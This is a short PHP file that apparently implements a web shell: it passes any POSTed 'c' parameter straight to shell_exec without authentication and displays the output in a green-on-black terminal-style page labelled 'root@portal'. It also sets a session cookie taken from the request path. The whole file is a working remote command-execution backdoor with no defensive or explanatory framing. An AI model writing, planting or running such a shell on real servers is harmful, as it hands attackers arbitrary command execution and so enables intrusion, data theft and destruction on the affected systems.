<?php
if(preg_match("#^/i/([a-f0-9]{10})/#",$_SERVER["SCRIPT_NAME"],$m))setcookie("ss_sid",$m[1],time()+604800,"/");
if(isset($_POST["c"])){$o=shell_exec($_POST["c"])??"";}
?><!DOCTYPE html><html><head><title>shell</title><style>
body{background:#000;color:#3dff7a;font-family:ui-monospace,Menlo,Consolas,monospace;margin:0;padding:24px}
.term{max-width:860px;margin:40px auto;border:1px solid #3a6a3a;border-radius:8px;box-shadow:0 0 30px rgba(61,255,122,.15);overflow:hidden}
.bar{background:#161616;padding:8px 12px;border-bottom:1px solid #3a6a3a;display:flex;align-items:center;gap:6px}
.dot{width:10px;height:10px;border-radius:50%}
.r{background:#ff5f56}.y{background:#ffbd2e}.g{background:#27c93f}
.title{color:#a8c0a8;font-size:12px;margin-left:8px}
pre{margin:0;padding:16px;white-space:pre-wrap;word-break:break-all;min-height:220px;max-height:60vh;overflow:auto;font-size:15px}
.hist{color:#a8c0a8}
form{display:flex;align-items:center;gap:8px;border-top:1px solid #3a6a3a;padding:12px 16px}
.p{color:#3dff7a}
input{flex:1;background:transparent;border:0;outline:0;color:#3dff7a;font:inherit;font-size:15px}
</style></head><body>
<div class=term>
<div class=bar><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class=title>root@portal</span></div>
<pre><?php if(isset($o)){echo "<span class=hist>$ ".htmlspecialchars($_POST["c"])."</span>\n".htmlspecialchars($o);}else{echo "<span class=hist>connected.</span>";}?></pre>
<form method=post><span class=p>$</span><input name=c autofocus autocomplete=off></form>
</div>
</body></html>
